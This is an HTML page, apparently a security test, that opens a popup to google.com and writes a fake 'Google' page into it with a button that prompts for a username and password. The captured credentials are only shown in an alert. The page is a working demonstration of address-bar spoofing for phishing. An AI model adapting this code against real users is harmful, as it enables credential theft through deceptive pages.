<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Test v4</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>

<h1>Test v4</h1>
<button onclick="spoof()">Open</button>

<script>
function spoof() {

  // 1️⃣ Popup dibuka langsung dari user gesture
  const win = window.open("https://google.com", "_blank");

  if (!win) {
    alert("Popup blocked");
    return;
  }

  // 2️⃣ Konten ditulis ke SAME-ORIGIN window
  win.document.open();
  win.document.write(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Google</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <style>
        body {
          font-family: Arial, sans-serif;
          text-align: center;
          padding-top: 40px;
        }
        button {
          padding: 12px 24px;
          font-size: 16px;
        }
      </style>
    </head>
    <body>
      <h1>This is not Google!</h1>
      <button onclick="capture()">Click me</button>

      <script>
        function capture() {
          let username = prompt('Enter your username');
          let password = prompt('Enter your password');
          alert(
            'Your creds:\\n' +
            'Username: ' + username + '\\n' +
            'Password: ' + password
          );
        }
      <\/script>
    </body>
    </html>
  `);
  win.document.close();
}
</script>

</body>
</html>
